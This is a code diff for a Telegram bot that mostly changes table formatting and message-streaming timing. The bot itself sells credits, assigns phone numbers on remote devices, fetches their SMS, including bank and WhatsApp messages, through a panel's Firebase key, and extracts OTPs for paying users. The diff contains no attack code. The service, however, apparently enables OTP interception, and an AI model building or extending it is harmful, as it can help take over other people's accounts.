@@ -456,7 +456,12 @@ function tableBlock(headers: string[], rows: Array<Array<string | number>>): str
   const widths = safeHeaders.map((header, index) =>
     Math.max(header.length, ...safeRows.map((row) => row[index]?.length ?? 0)),
   );
-  const line = (cells: string[]) => cells.map((cell, index) => cell.padEnd(widths[index], " ")).join("  ");
+  const center = (cell: string, width: number) => {
+    const left = Math.floor((width - cell.length) / 2);
+    const right = width - cell.length - left;
+    return `${" ".repeat(Math.max(0, left))}${cell}${" ".repeat(Math.max(0, right))}`;
+  };
+  const line = (cells: string[]) => cells.map((cell, index) => center(cell, widths[index])).join("  ");
   const rule = widths.map((width) => "─".repeat(width)).join("  ");
   return `<pre>${line(safeHeaders)}\n${rule}\n${safeRows.map(line).join("\n")}</pre>`;
 }
@@ -485,7 +490,7 @@ function richTableBlock(headers: string[], rows: Array<Array<string | number>>, 
   }));
   return [
     `| ${safeHeaders.join(" | ")} |`,
-    `| ${safeHeaders.map(() => ":---").join(" | ")} |`,
+    `| ${safeHeaders.map(() => ":---:").join(" | ")} |`,
     ...safeRows.map((row) => `| ${row.join(" | ")} |`),
   ].join("\n");
 }
@@ -1078,7 +1083,7 @@ function setupHandlers(bot: TelegramBot) {
     const plainPreview = stripHtmlToText(html).slice(0, 900);
     let sentAnyDraft = false;
 
-    for (let i = 85; i <= plainPreview.length; i += 85) {
+    for (let i = 140; i <= plainPreview.length; i += 140) {
       const result = await rawTelegramRequest("sendMessageDraft", {
         chat_id: cid,
         draft_id: draftId,
@@ -1090,7 +1095,7 @@ function setupHandlers(bot: TelegramBot) {
         break;
       }
       sentAnyDraft = true;
-      await wait(70);
+      await wait(25);
     }
 
     if (sentAnyDraft && plainPreview.length) {
@@ -1100,7 +1105,7 @@ function setupHandlers(bot: TelegramBot) {
         text: plainPreview,
         can_stop: true,
       }).catch(() => {});
-      await wait(80);
+      await wait(35);
     }
 
     await send(cid, finalHtml, opts);
@@ -1320,7 +1325,7 @@ function setupHandlers(bot: TelegramBot) {
           takenAt: Date.now(),
         });
 
-        await send(
+        await streamAiDraft(
           chatId,
           generatedNumberMessage(device, displayPhone, creditsAfterPurchase),
           {
@@ -1394,7 +1399,7 @@ function setupHandlers(bot: TelegramBot) {
           takenAt: Date.now(),
         });
 
-        await send(
+        await streamAiDraft(
           chatId,
           generatedNumberMessage(device2, displayPhone2, creditsAfterPurchase2),
           {
@@ -1426,7 +1431,7 @@ function setupHandlers(bot: TelegramBot) {
         const lastEntry = histData[telegramId]?.find(h => h.deviceId === user.assignedDeviceId);
         const watchPhone = lastEntry?.phoneNumber || user.assignedDeviceId;
 
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.eye, "")} <b>WATCHING FOR OTPS...</b>\n` +
           `${divider()}\n\n` +
@@ -1509,7 +1514,7 @@ function setupHandlers(bot: TelegramBot) {
         const iv = watchIntervals.get(telegramId);
         if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
         await db.update(botUsersTable).set({ state: "number_menu" }).where(eq(botUsersTable.id, user.id));
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.stop, "")} <b>WATCH STOPPED.</b>`,
           { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
@@ -1529,7 +1534,7 @@ function setupHandlers(bot: TelegramBot) {
         }
         const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId);
         if (messages.length === 0) {
-          await send(
+          await streamAiDraft(
             chatId,
  `${em(E.history, "")} <b>KOI SMS NAHI MILA.</b>\n\nAbhi tak is number pe koi SMS nahi aaya.`,
             { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
@@ -1539,7 +1544,7 @@ function setupHandlers(bot: TelegramBot) {
         // Send every latest SMS separately so long WhatsApp/bank messages are
         // not cropped inside one Telegram message.
         const top5 = messages.slice(0, 5);
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.history, "")} <b>SMS HISTORY</b> (${messages.length} total, showing 5 latest)\n${divider()}`,
           { parse_mode: "HTML" }
@@ -1547,7 +1552,7 @@ function setupHandlers(bot: TelegramBot) {
         for (let i = 0; i < top5.length; i++) {
           const m = top5[i];
           const otp = extractOtpFromText(m.text);
-          await send(
+          await streamAiDraft(
             chatId,
             `<b>${i + 1}. ${escapeTelegramHtml(m.sender)}</b>\n` +
             `${em(E.timer, "")} ${escapeTelegramHtml(m.time || "—")}\n` +
@@ -1565,7 +1570,7 @@ function setupHandlers(bot: TelegramBot) {
         const userHist = histAll[telegramId] || [];
 
         if (userHist.length === 0) {
-          await send(
+          await streamAiDraft(
             chatId,
  `${em(E.phone, "")} <b>NUMBERS HISTORY</b>\n${divider()}\n\n` +
             `Abhi tak koi number generate nahi hua.\nPehle <b>GET NUMBER</b> dabao!`,
@@ -1587,7 +1592,7 @@ function setupHandlers(bot: TelegramBot) {
           );
         }).join(`\n${divider()}\n`);
 
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.phone, "")} <b>NUMBERS HISTORY</b> (${userHist.length} total)\n${divider()}\n\n${histLines}`,
           { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
@@ -1647,7 +1652,7 @@ function setupHandlers(bot: TelegramBot) {
           totalOnline += devs.filter((d) => d.status).length;
         }
         await db.update(botUsersTable).set({ state: "search_number" }).where(eq(botUsersTable.id, user.id));
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.search, "")} <b>SEARCH NUMBER</b>\n` +
           `${divider()}\n\n` +
@@ -1694,7 +1699,7 @@ function setupHandlers(bot: TelegramBot) {
 
       if (text === sct("GIFT CARD")) {
         await db.update(botUsersTable).set({ state: "gift_card" }).where(eq(botUsersTable.id, user.id));
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.gift, "")} <b>GIFT CARD REDEEM</b>\n` +
           `${divider()}\n\n` +
@@ -1707,7 +1712,7 @@ function setupHandlers(bot: TelegramBot) {
 
       if (text === sct("WEB PANEL")) {
         if (user.smsCredits < WEB_PANEL_MIN_CREDITS) {
-          await send(
+          await streamAiDraft(
             chatId,
  `${em(E.lock, "")} <b>WEB PANEL — LOCKED!</b>\n\n` +
             `${em(E.star, "")} WEB PANEL OPEN KARNE KE LIYE <b>${WEB_PANEL_MIN_CREDITS} CREDITS</b> CHAHIYE.\n\n` +
@@ -1736,7 +1741,7 @@ function setupHandlers(bot: TelegramBot) {
         const license = createMiniAppLicense(user.telegramId, currentExpiry);
         const webUrl = `${baseUrl}/miniapp?license=${encodeURIComponent(license)}`;
 
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.check, "")} <b>WEB PANEL ACCESS GRANTED!</b>\n\n` +
           `${em(E.credits, "")} CREDITS: <b>${user.smsCredits}</b>\n` +
@@ -1756,7 +1761,7 @@ function setupHandlers(bot: TelegramBot) {
 
       if (text === sct("SEND SMS")) {
         if (!user.sendSmsUnlocked) {
-          await send(
+          await streamAiDraft(
             chatId,
  `${em(E.lock, "")} <b>SEND SMS LOCKED</b>\n\n` +
             `SMS BHEJNE KE LIYE <b>10 REFERRALS</b> COMPLETE KARO.\n` +
@@ -1768,7 +1773,7 @@ function setupHandlers(bot: TelegramBot) {
         }
 
         if (user.smsCredits <= 0) {
-          await send(
+          await streamAiDraft(
             chatId,
  `${em(E.buy, "")} <b>SEND SMS</b>\n\nAPAKE PAAS 0 SMS CREDITS HAIN.\nREFERRALS KARO TO CREDITS EARN KARO.`,
             { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
@@ -1776,7 +1781,7 @@ function setupHandlers(bot: TelegramBot) {
           return;
         }
 
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.phone, "")} <b>SEND SMS</b>\n` +
           `${divider()}\n\n` +
@@ -1882,7 +1887,7 @@ function setupHandlers(bot: TelegramBot) {
         if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
         const creditsAfterRefund = await refundNumberCreditIfUnused(user);
         await db.update(botUsersTable).set({ state: "main_menu", stateData: null }).where(eq(botUsersTable.id, user.id));
-        await send(
+        await streamAiDraft(
           chatId,
  `${em(E.lightning, "")} <b>MAIN MENU</b>\n\n${em(E.credits, "")} CREDITS: <b>${creditsAfterRefund}</b>`,
           { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
@@ -1944,7 +1949,7 @@ function setupHandlers(bot: TelegramBot) {
           .where(eq(botUsersTable.id, user.id));
 
         const paymentSettings = await getPaymentSettings();
-        await send(chatId, paymentMethodMessage(pending, paymentSettings), { parse_mode: "HTML", reply_markup: paymentMethodKeyboard(paymentSettings) as any });
+        await streamAiDraft(chatId, paymentMethodMessage(pending, paymentSettings), { parse_mode: "HTML", reply_markup: paymentMethodKeyboard(paymentSettings) as any });
         return;
       }
 
@@ -2214,7 +2219,7 @@ function setupHandlers(bot: TelegramBot) {
         const selectedPending: PendingCreditPayment = { ...pending, method: data === "paymethod_upi" ? "upi" : "usdt" };
         const paymentSettings = await getPaymentSettings();
         if (data === "paymethod_upi" && !isUpiAvailable(paymentSettings)) {
-          await send(
+          await streamAiDraft(
             chatId,
             `${em(E.warn, "")} <b>UPI TEMPORARILY UNAVAILABLE</b>\n${divider()}\n\n` +
             `Admin ne abhi UPI payment info blank rakhi hai. Thodi der baad try karo ya doosra payment method choose karo.`,
@@ -2223,7 +2228,7 @@ function setupHandlers(bot: TelegramBot) {
           return;
         }
         if (data === "paymethod_usdt" && !isUsdtAvailable(paymentSettings)) {
-          await send(
+          await streamAiDraft(
             chatId,
             `${em(E.warn, "")} <b>USDT TEMPORARILY UNAVAILABLE</b>\n${divider()}\n\n` +
             `Admin ne abhi USDT/Binance payment info complete nahi rakhi hai. Thodi der baad try karo ya doosra payment method choose karo.`,
@@ -2249,7 +2254,7 @@ function setupHandlers(bot: TelegramBot) {
           reply_markup: cancelKeyboard() as any,
           });
         } else {
-          await send(
+          await streamAiDraft(
             chatId,
             `${em(E.usdt, "")} <b>USDT PAYMENT</b>\n${divider()}\n\n` +
             `${em(E.credits, "")} <b>PACKAGE:</b> ${selectedPending.credits} CREDITS\n` +
